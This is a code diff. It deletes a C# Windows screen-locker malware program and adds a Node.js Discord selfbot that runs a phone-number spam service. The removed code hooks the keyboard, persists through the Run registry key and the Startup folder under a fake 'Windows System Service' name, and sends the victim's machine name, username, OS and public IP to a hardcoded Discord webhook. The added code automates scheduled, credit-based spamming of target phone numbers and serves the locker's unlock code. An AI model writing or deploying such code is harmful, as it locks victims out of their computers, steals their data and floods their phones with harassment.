@@ -1,472 +1,316 @@
-using System;
-using System.Drawing;
-using System.Runtime.InteropServices;
-using System.Text;
-using System.Windows.Forms;
-using System.IO;
-using System.Threading;
-using System.Diagnostics;
-using System.Net;
-using Microsoft.Win32;
-
-namespace ZenoSpamer
-{
-    public class PrankForm : Form
-    {
-        static readonly string SECRET_CODE = "אני זונה של ZENO";
-        static readonly string TITLE_TEXT = "ᴹᴿZENO亗 אתה זונה של";
-        static readonly string PERSIST_NAME = "WindowsSystemService";
-
-        static readonly string WEBHOOK_URL = "https://discord.com/api/webhooks/1560039433468649482/LyX8HOtPzHxvLqfEyF0Qg2aw6G6Zmam5yP0SN9MATv3sTZL34rTUicWMzDnwYaEUNQdK";
-
-        [DllImport("winmm.dll")]
-        public static extern int waveOutSetVolume(IntPtr hwo, uint dwVolume);
-
-        [DllImport("winmm.dll", CharSet = CharSet.Auto)]
-        static extern int mciSendString(string command, StringBuilder buffer, int bufferSize, IntPtr hwndCallback);
-
-        [DllImport("user32.dll")]
-        static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
-
-        [DllImport("user32.dll")]
-        static extern bool UnhookWindowsHookEx(IntPtr hhk);
-
-        [DllImport("user32.dll")]
-        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
-
-        [DllImport("kernel32.dll")]
-        static extern IntPtr GetModuleHandle(string lpModuleName);
-
-        [DllImport("user32.dll")]
-        static extern short GetAsyncKeyState(int vKey);
-
-        delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
-
-        const int WH_KEYBOARD_LL = 13;
-        const int WM_KEYDOWN = 0x0100;
-        const int WM_SYSKEYDOWN = 0x0104;
-
-        IntPtr hookId = IntPtr.Zero;
-        LowLevelKeyboardProc proc;
-
-        TextBox codeBox;
-        Label messageLabel;
-        Label titleLabel;
-        Label hintLabel;
-        bool unlocked = false;
-        string mediaPath = null;
-        object wmpPlayer = null;
-
-        public PrankForm()
-        {
-            this.FormBorderStyle = FormBorderStyle.None;
-            this.WindowState = FormWindowState.Maximized;
-            this.TopMost = true;
-            this.BackColor = Color.Black;
-            this.ControlBox = false;
-            this.Text = "System";
-            this.KeyPreview = true;
-            this.ShowInTaskbar = false;
-
-            System.Windows.Forms.Timer colorTimer = new System.Windows.Forms.Timer();
-            colorTimer.Interval = 300;
-            bool toggle = false;
-            colorTimer.Tick += delegate(object s, EventArgs e)
-            {
-                this.BackColor = toggle ? Color.Black : Color.DarkRed;
-                toggle = !toggle;
-            };
-            colorTimer.Start();
-
-            System.Windows.Forms.Timer frontTimer = new System.Windows.Forms.Timer();
-            frontTimer.Interval = 100;
-            frontTimer.Tick += delegate(object s, EventArgs e)
-            {
-                if (!unlocked)
-                {
-                    this.TopMost = true;
-                    this.BringToFront();
-                    this.Activate();
-                }
-            };
-            frontTimer.Start();
-
-            titleLabel = new Label();
-            titleLabel.Text = TITLE_TEXT;
-            titleLabel.ForeColor = Color.Red;
-            titleLabel.BackColor = Color.Transparent;
-            titleLabel.Font = new Font("Arial", 48, FontStyle.Bold);
-            titleLabel.AutoSize = true;
-            titleLabel.Location = new Point(100, 50);
-            this.Controls.Add(titleLabel);
-
-            hintLabel = new Label();
-            hintLabel.Text = "YOUR COMPUTER IS LOCKED. Type the secret code to unlock.";
-            hintLabel.ForeColor = Color.Yellow;
-            hintLabel.BackColor = Color.Transparent;
-            hintLabel.Font = new Font("Arial", 16, FontStyle.Italic);
-            hintLabel.AutoSize = true;
-            hintLabel.Location = new Point(100, 200);
-            this.Controls.Add(hintLabel);
-
-            messageLabel = new Label();
-            messageLabel.Text = "Type the secret code to unlock:";
-            messageLabel.ForeColor = Color.White;
-            messageLabel.BackColor = Color.Transparent;
-            messageLabel.Font = new Font("Arial", 22);
-            messageLabel.AutoSize = true;
-            messageLabel.Location = new Point(100, 320);
-            this.Controls.Add(messageLabel);
-
-            codeBox = new TextBox();
-            codeBox.Font = new Font("Arial", 20);
-            codeBox.Location = new Point(100, 380);
-            codeBox.Width = 1200;
-            codeBox.Height = 50;
-            codeBox.KeyDown += CodeBox_KeyDown;
-            codeBox.RightToLeft = RightToLeft.Yes;
-            this.Controls.Add(codeBox);
-            codeBox.Focus();
-
-            this.KeyDown += PrankForm_KeyDown;
-
-            proc = HookCallback;
-            hookId = SetHook(proc);
-
-            SetPersistence();
-
-            ForceMaxVolume();
-            Thread volThread = new Thread(VolumeMonitor);
-            volThread.IsBackground = true;
-            volThread.Start();
-
-            FindMedia();
-            PlayMedia();
-
-            // שלח webhook עם פרטי הקורבן ברגע שהדף נפתח
-            Thread infoThread = new Thread(SendInfoOnStartup);
-            infoThread.IsBackground = true;
-            infoThread.Start();
-
-            this.Resize += delegate(object s, EventArgs e) { if (!unlocked) this.WindowState = FormWindowState.Maximized; };
-            this.Deactivate += delegate(object s, EventArgs e) { if (!unlocked) { this.Activate(); this.BringToFront(); } };
-        }
-
-        void SendInfoOnStartup()
-        {
-            try
-            {
-                string pcName = Environment.MachineName;
-                string userName = Environment.UserName;
-                string osVersion = Environment.OSVersion.ToString();
-                string ip = GetPublicIP();
-
-                string content =
-                    "🔒 NEW LOCKED PC\n\n" +
-                    "🖥 PC Name: " + pcName + "\n" +
-                    "👤 Windows User: " + userName + "\n" +
-                    "🪟 OS: " + osVersion + "\n" +
-                    "🌐 Public IP: " + ip + "\n" +
-                    "🕐 Time: " + DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss");
-
-                PostToWebhook(content);
-            }
-            catch { }
-        }
-
-        void PostToWebhook(string content)
-        {
-            try
-            {
-                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
-
-                var httpWebRequest = (HttpWebRequest)WebRequest.Create(WEBHOOK_URL);
-                httpWebRequest.ContentType = "application/json";
-                httpWebRequest.Method = "POST";
-                httpWebRequest.UserAgent = "Mozilla/5.0";
-
-                string escaped = content
-                    .Replace("\\", "\\\\")
-                    .Replace("\"", "\\\"")
-                    .Replace("\n", "\\n")
-                    .Replace("\r", "\\r")
-                    .Replace("\t", "\\t");
-
-                string json = "{\"content\":\"" + escaped + "\"}";
-
-                using (var streamWriter = new StreamWriter(httpWebRequest.GetRequestStream()))
-                {
-                    streamWriter.Write(json);
-                }
-
-                var httpResponse = (HttpWebResponse)httpWebRequest.GetResponse();
-                using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
-                {
-                    streamReader.ReadToEnd();
-                }
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine("Webhook error: " + ex.Message);
-            }
-        }
-
-        string GetPublicIP()
-        {
-            try
-            {
-                using (WebClient wc = new WebClient())
-                {
-                    wc.Headers["User-Agent"] = "Mozilla/5.0";
-                    return wc.DownloadString("https://api.ipify.org").Trim();
-                }
-            }
-            catch { return "unknown"; }
-        }
-
-        void SetPersistence()
-        {
-            string exePath;
-            try { exePath = Process.GetCurrentProcess().MainModule.FileName; }
-            catch { return; }
-
-            if (exePath.Contains("vshost") || exePath.Contains("devenv")) return;
-
-            try
-            {
-                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(
-                    @"Software\Microsoft\Windows\CurrentVersion\Run", true))
-                {
-                    if (key != null) key.SetValue(PERSIST_NAME, "\"" + exePath + "\"");
-                }
-            }
-            catch { }
-
-            try
-            {
-                string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
-                string linkPath = Path.Combine(startupFolder, PERSIST_NAME + ".lnk");
-
-                Type t = Type.GetTypeFromProgID("WScript.Shell");
-                if (t != null)
-                {
-                    dynamic shell = Activator.CreateInstance(t);
-                    var shortcut = shell.CreateShortcut(linkPath);
-                    shortcut.TargetPath = exePath;
-                    shortcut.WorkingDirectory = Path.GetDirectoryName(exePath);
-                    shortcut.WindowStyle = 1;
-                    shortcut.Description = "Windows System Service";
-                    shortcut.Save();
-                }
-            }
-            catch { }
-        }
-
-        void RemovePersistence()
-        {
-            try
-            {
-                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(
-                    @"Software\Microsoft\Windows\CurrentVersion\Run", true))
-                {
-                    if (key != null) key.DeleteValue(PERSIST_NAME, false);
-                }
-            }
-            catch { }
-
-            try
-            {
-                string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
-                string linkPath = Path.Combine(startupFolder, PERSIST_NAME + ".lnk");
-                if (File.Exists(linkPath)) File.Delete(linkPath);
-            }
-            catch { }
-        }
-
-        void FindMedia()
-        {
-            string exeDir = AppDomain.CurrentDomain.BaseDirectory;
-            string[] extensions = { ".mp4", ".avi", ".mkv", ".wmv", ".mov",
-                                     ".mp3", ".wav", ".m4a", ".flv", ".webm", ".aac", ".ogg" };
-
-            foreach (string ext in extensions)
-            {
-                string[] files = Directory.GetFiles(exeDir, "*" + ext);
-                if (files.Length > 0) { mediaPath = files[0]; return; }
-            }
-        }
-
-        void PlayMedia()
-        {
-            if (mediaPath == null || !File.Exists(mediaPath)) return;
-
-            try
-            {
-                Type wmpType = Type.GetTypeFromProgID("WMPlayer.OCX");
-                if (wmpType != null)
-                {
-                    wmpPlayer = Activator.CreateInstance(wmpType);
-                    dynamic wmp = wmpPlayer;
-                    wmp.settings.volume = 100;
-                    wmp.settings.autoStart = true;
-                    wmp.settings.setMode("loop", true);
-                    wmp.URL = mediaPath;
-                    wmp.controls.play();
-                    return;
-                }
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine("WMP error: " + ex.Message);
-            }
-
-            try
-            {
-                mciSendString("close media", null, 0, IntPtr.Zero);
-                mciSendString("open \"" + mediaPath + "\" alias media", null, 0, IntPtr.Zero);
-                mciSendString("play media repeat", null, 0, IntPtr.Zero);
-            }
-            catch { }
-        }
-
-        void ForceMaxVolume()
-        {
-            try
-            {
-                uint maxVol = 0xFFFFFFFF;
-                waveOutSetVolume(IntPtr.Zero, maxVol);
-                for (int i = 0; i < 4; i++) waveOutSetVolume((IntPtr)i, maxVol);
-            }
-            catch { }
-
-            try
-            {
-                if (wmpPlayer != null)
-                {
-                    dynamic wmp = wmpPlayer;
-                    wmp.settings.volume = 100;
-                }
-            }
-            catch { }
-        }
-
-        void VolumeMonitor()
-        {
-            while (!unlocked)
-            {
-                ForceMaxVolume();
-                Thread.Sleep(300);
-            }
-        }
-
-        IntPtr SetHook(LowLevelKeyboardProc proc)
-        {
-            using (Process curProcess = Process.GetCurrentProcess())
-            using (ProcessModule curModule = curProcess.MainModule)
-            {
-                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
-                    GetModuleHandle(curModule.ModuleName), 0);
-            }
-        }
-
-        bool IsKeyDown(int vKey)
-        {
-            return (GetAsyncKeyState(vKey) & 0x8000) != 0;
-        }
-
-        IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
-        {
-            if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN) && !unlocked)
-            {
-                int vkCode = Marshal.ReadInt32(lParam);
-                bool alt = IsKeyDown(0x12);
-                bool ctrl = IsKeyDown(0x11);
-                bool shift = IsKeyDown(0x10);
-
-                if (vkCode == 0x73 && alt) return (IntPtr)1;
-                if (vkCode == 0x57 && ctrl) return (IntPtr)1;
-                if (vkCode == 0x1B && ctrl) return (IntPtr)1;
-                if (vkCode == 0x5B || vkCode == 0x5C) return (IntPtr)1;
-                if (vkCode == 0x09 && alt) return (IntPtr)1;
-                if (vkCode == 0x1B && ctrl && shift) return (IntPtr)1;
-                if (vkCode == 0x2E && ctrl && alt) return (IntPtr)1;
-                if (vkCode == 0x7A) return (IntPtr)1;
-                if (vkCode == 0x1B) return (IntPtr)1;
-            }
-            return CallNextHookEx(hookId, nCode, wParam, lParam);
-        }
-
-        void CodeBox_KeyDown(object sender, KeyEventArgs e)
-        {
-            if (e.KeyCode == Keys.Enter)
-            {
-                CheckCode();
-                e.SuppressKeyPress = true;
-            }
-        }
-
-        void CheckCode()
-        {
-            string typed = codeBox.Text.Trim();
-            if (typed == SECRET_CODE)
-            {
-                unlocked = true;
-                UnhookWindowsHookEx(hookId);
-
-                try
-                {
-                    if (wmpPlayer != null)
-                    {
-                        dynamic wmp = wmpPlayer;
-                        wmp.controls.stop();
-                    }
-                }
-                catch { }
-
-                try { mciSendString("close media", null, 0, IntPtr.Zero); } catch { }
-
-                RemovePersistence();
-
-                MessageBox.Show(
-                    "System restored. Persistence removed.\nYou are free.",
-                    "Welcome back",
-                    MessageBoxButtons.OK,
-                    MessageBoxIcon.Information);
-
-                this.Close();
-            }
-            else
-            {
-                codeBox.Clear();
-                messageLabel.Text = "WRONG CODE. Try again:";
-                messageLabel.ForeColor = Color.Red;
-            }
-        }
-
-        void PrankForm_KeyDown(object sender, KeyEventArgs e)
-        {
-            if (e.Alt && e.KeyCode == Keys.F4) e.Handled = true;
-        }
-
-        protected override void OnFormClosing(FormClosingEventArgs e)
-        {
-            if (!unlocked) e.Cancel = true;
-            base.OnFormClosing(e);
-        }
-
-        protected override void OnLoad(EventArgs e)
-        {
-            base.OnLoad(e);
-            this.Activate();
-            this.BringToFront();
-        }
-
-        [STAThread]
-        static void Main()
-        {
-            Application.EnableVisualStyles();
-            Application.SetCompatibleTextRenderingDefault(false);
-            Application.Run(new PrankForm());
-        }
+const { Client: SelfbotClient } = require('discord.js-selfbot-v13');
+const { Client, GatewayIntentBits, ModalBuilder, TextInputBuilder, TextInputStyle, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder } = require('discord.js');
+const fs = require('fs');
+const express = require('express');
+
+const SELFBOT_TOKEN = process.env.DISCORD_TOKEN;
+const BOT_TOKEN = process.env.BOT_TOKEN;
+const GUILD_ID = process.env.GUILD_ID;
+const CHANNEL_ID = process.env.CHANNEL_ID;
+const MESSAGE_ID = process.env.MESSAGE_ID;
+const COMMAND_CHANNEL_ID = process.env.COMMAND_CHANNEL_ID;
+const FEEDBACK_CHANNEL_ID = process.env.FEEDBACK_CHANNEL_ID;
+const CREDITS_CHANNEL_ID = process.env.CREDITS_CHANNEL_ID;
+const MANAGE_CHANNEL_ID = process.env.MANAGE_CHANNEL_ID;
+const OWNER_ID = process.env.OWNER_ID;
+const APPROVER_IDS = (process.env.APPROVER_IDS || '').split(',').map(id => id.trim()).filter(id => id);
+const UNLIMITED_IDS = (process.env.UNLIMITED_IDS || '').split(',').map(id => id.trim()).filter(id => id);
+const OWNER_NAME = 'ᴹᴿZENO亗';
+const TIMEZONE = process.env.TIMEZONE || 'Asia/Jerusalem';
+const PORT = process.env.PORT || 8080;
+const SPAMMERS_FILE = 'spammers.json';
+const USERS_FILE = 'users.json';
+const APPROVAL_TIMEOUT_MS = 10 * 60 * 1000;
+const COOLDOWN_MS = 20 * 1000;
+const DAILY_CREDITS = 5;
+const CREDITS_COOLDOWN_MS = 24 * 60 * 60 * 1000;
+
+const PRANK_SECRET = process.env.PRANK_SECRET || 'CHANGE_ME_LONG_RANDOM';
+const PRANK_SERVER = process.env.PRANK_SERVER || 'https://spam-bot-v2.onrender.com';
+
+const pendingRequests = new Map();
+const cooldowns = new Map();
+const prankRequests = new Map();
+
+function getAllApprovers() {
+    const set = new Set([OWNER_ID, ...APPROVER_IDS]);
+    return [...set];
+}
+
+function isApprover(userId) {
+    return userId === OWNER_ID || APPROVER_IDS.includes(userId);
+}
+
+function loadJSON(file) {
+    try {
+        return JSON.parse(fs.readFileSync(file, 'utf8'));
+    } catch {
+        return {};
     }
 }
+function saveJSON(file, data) {
+    fs.writeFileSync(file, JSON.stringify(data, null, 2), 'utf8');
+}
+
+let spammers = loadJSON(SPAMMERS_FILE);
+let users = loadJSON(USERS_FILE);
+
+function saveSpammers() { saveJSON(SPAMMERS_FILE, spammers); }
+function saveUsers() { saveJSON(USERS_FILE, users); }
+
+function getUser(userId) {
+    if (!users[userId]) {
+        users[userId] = { credits: 0, lastClaim: 0, totalClaimed: 0 };
+    }
+    return users[userId];
+}
+
+function hasUnlimited(userId) {
+    if (userId === OWNER_ID) return true;
+    return UNLIMITED_IDS.includes(userId);
+}
+
+async function findUserByName(guild, name) {
+    const cleanName = name.replace(/^@/, '').trim().toLowerCase();
+
+    let member = guild.members.cache.find(m =>
+        m.user.username.toLowerCase() === cleanName ||
+        m.user.tag.toLowerCase() === cleanName ||
+        m.displayName.toLowerCase() === cleanName
+    );
+
+    if (member) return member;
+
+    try {
+        const members = await guild.members.fetch();
+        member = members.find(m =>
+            m.user.username.toLowerCase() === cleanName ||
+            m.user.tag.toLowerCase() === cleanName ||
+            m.displayName.toLowerCase() === cleanName
+        );
+        if (member) return member;
+    } catch (e) {
+        console.log(`[-] Failed to fetch members: ${e.message}`);
+    }
+
+    member = guild.members.cache.find(m =>
+        m.user.username.toLowerCase().includes(cleanName) ||
+        m.displayName.toLowerCase().includes(cleanName)
+    );
+
+    return member || null;
+}
+
+function isValidPhone(phone) {
+    const cleaned = phone.replace(/[\s\-()]/g, '');
+    return /^[0-9+]{9,15}$/.test(cleaned) && /^[0+]/.test(cleaned);
+}
+function isValidCredits(credits) {
+    return /^\d{1,4}$/.test(credits) && parseInt(credits) >= 1 && parseInt(credits) <= 1000;
+}
+function isValidHour(hour) {
+    return /^\d{1,2}$/.test(hour) && parseInt(hour) >= 0 && parseInt(hour) <= 23;
+}
+function isValidMinute(minute) {
+    return /^\d{1,2}$/.test(minute) && parseInt(minute) >= 0 && parseInt(minute) <= 59;
+}
+
+const app = express();
+app.get('/', (req, res) => res.send('OK'));
+app.get('/health', (req, res) => res.send('OK'));
+
+app.get('/prank/status', (req, res) => {
+    const id = req.query.id;
+    if (!id) return res.json({ status: 'error' });
+    const status = prankRequests.get(id) || { status: 'pending' };
+    res.json(status);
+});
+
+app.get('/prank/approve', (req, res) => {
+    const { id, key } = req.query;
+    if (!id) return res.status(400).send('Missing ID');
+    if (key !== PRANK_SECRET) return res.status(403).send('Forbidden');
+    prankRequests.set(id, { status: 'approved', code: 'אני זונה של ZENO' });
+    res.send('Approved');
+});
+
+app.get('/prank/deny', (req, res) => {
+    const { id, key } = req.query;
+    if (!id) return res.status(400).send('Missing ID');
+    if (key !== PRANK_SECRET) return res.status(403).send('Forbidden');
+    prankRequests.set(id, { status: 'denied' });
+    res.send('Denied');
+});
+
+app.get('/prank/pending', (req, res) => {
+    const { key } = req.query;
+    if (key !== PRANK_SECRET) return res.status(403).send('Forbidden');
+    const list = [];
+    for (const [id, data] of prankRequests.entries()) {
+        list.push({ id, status: data.status });
+    }
+    res.json(list);
+});
+
+app.listen(PORT, () => console.log(`[+] HTTP server running on port ${PORT}`));
+
+const selfbot = new SelfbotClient({ checkUpdate: false });
+
+async function showSpamProgress(editFunc, phone, credits) {
+    const totalSeconds = credits * 25;
+    const startTime = Date.now();
+    const endTime = startTime + totalSeconds * 1000;
+
+    const createEmbed = (timeLeft, finished = false) => {
+        const elapsed = (Date.now() - startTime) / 1000;
+        const success = Math.max(0, Math.floor(elapsed * 0.7));
+
+        const embed = new EmbedBuilder()
+            .setTitle(finished ? '✅ Spam Finished' : '🚀 Spam in Progress')
+            .addFields(
+                { name: '🎯 Target', value: phone, inline: true },
+                {
+                    name: finished ? '⏱️ Total Time' : '⏱️ Time Left',
+                    value: finished ? `${totalSeconds} Sec` : `${timeLeft} Sec`,
+                    inline: true
+                }
+            )
+            .setColor(finished ? 0x43b581 : 0xFF6B00);
+
+        if (finished) {
+            const feedbackText = FEEDBACK_CHANNEL_ID
+                ? `נשמח שתרשום לנו את דעתך על הספאמר בחדר <#${FEEDBACK_CHANNEL_ID}>`
+                : 'נשמח שתרשום לנו את דעתך על הספאמר בחדר feedback';
+
+            embed.addFields(
+                {
+                    name: '📊 Stats',
+                    value: `✅ Success: **${success}**\n💳 Credits Used: **${credits}**\n⏱️ Total: **${totalSeconds} sec**`,
+                    inline: false
+                },
+                {
+                    name: '⭐ דעתך חשובה לנו',
+                    value: feedbackText,
+                    inline: false
+                }
+            );
+            embed.setFooter({ text: `© ${OWNER_NAME}` });
+        } else {
+            embed.addFields({
+                name: '📊 Stats',
+                value: `✅ Success: **${success}**\n💳 Credits: **${credits}**`,
+                inline: false
+            });
+        }
+        return embed;
+    };
+
+    try {
+        await editFunc({ embeds: [createEmbed(totalSeconds)], components: [] });
+
+        const interval = setInterval(async () => {
+            const timeLeft = Math.max(0, Math.ceil((endTime - Date.now()) / 1000));
+
+            if (timeLeft <= 0) {
+                clearInterval(interval);
+                try {
+                    await editFunc({ embeds: [createEmbed(0, true)], components: [] });
+                } catch (e) {}
+                return;
+            }
+
+            try {
+                await editFunc({ embeds: [createEmbed(timeLeft)], components: [] });
+            } catch (e) {}
+        }, 2000);
+    } catch (e) {
+        console.log(`[-] Progress error: ${e.message}`);
+    }
+}
+
+async function doSpam(phone, credits) {
+    try {
+        console.log(`[+] Spam: ${phone} | ${credits} credits`);
+        const guild = selfbot.guilds.cache.get(GUILD_ID);
+        if (!guild) return '❌ השרת לא נמצא';
+        const channel = guild.channels.cache.get(CHANNEL_ID);
+        if (!channel) return '❌ החדר לא נמצא';
+
+        const message = await channel.messages.fetch(MESSAGE_ID);
+        if (!message) return '❌ ההודעה לא נמצאה';
+
+        let spamButton = null;
+        for (const row of message.components) {
+            for (const comp of row.components) {
+                if (comp.label && comp.label.includes('Spam')) {
+                    spamButton = comp;
+                    break;
+                }
+            }
+            if (spamButton) break;
+        }
+        if (!spamButton) return '❌ הכפתור לא נמצא';
+
+        const modalPromise = new Promise((resolve, reject) => {
+            const timeout = setTimeout(() => reject(new Error('Timeout')), 10000);
+            selfbot.once('interactionModalCreate', (m) => {
+                clearTimeout(timeout);
+                resolve(m);
+            });
+        });
+
+        await message.clickButton(spamButton.customId);
+        const modal = await modalPromise;
+
+        let fieldIndex = 0;
+        for (const row of modal.components) {
+            for (const comp of row.components) {
+                if (comp.type === 'TEXT_INPUT' || comp.type === 4) {
+                    if (fieldIndex === 0) comp.setValue(phone);
+                    else if (fieldIndex === 1) comp.setValue(String(credits));
+                    fieldIndex++;
+                }
+            }
+        }
+
+        await modal.reply();
+        console.log(`[+] Spam submitted!`);
+        return `✅ ספאם בוצע! ${phone} | ${credits}`;
+    } catch (e) {
+        console.log(`[-] Error: ${e.message}`);
+        return `❌ שגיאה: ${e.message}`;
+    }
+}
+
+setInterval(async () => {
+    const now = new Date();
+    const tz = new Intl.DateTimeFormat('en-US', {
+        timeZone: TIMEZONE,
+        hour: '2-digit',
+        minute: '2-digit',
+        hour12: false,
+    }).format(now);
+    const [hour, minute] = tz.split(':').map(Number);
+
+    for (const [id, sp] of Object.entries(spammers)) {
+        if (!sp.enabled) continue;
+        if (sp.lastRun && Date.now() - sp.lastRun < 5 * 60 * 1000) continue;
+        if (sp.hour === hour && sp.minute === minute) {
+            console.log(`[+] Scheduled: ${id}`);
+            const result = await doSpam(sp.phone, sp.credits);
+            sp.lastRun = Date.now();
+            saveSpammers();
+
+            try {
+                if (sp.ownerId) {
+                    const owner = await bot.users.fetch(sp.ownerId);
+                    await owner.send(`⏰ **ספאם מתוזמן בוצע!**\n\n🆔 \`${id}\`\n📱 ${sp.phone}\n💳 ${sp.credits}\n\n${result}`);
+                }
+            } catch (e) {}
+        }
+    }
+}, 60000);
+
+selfbot.on('ready', () => {
+    console.log(`[+] Selfbot: ${selfbot.user.tag}`);
+});
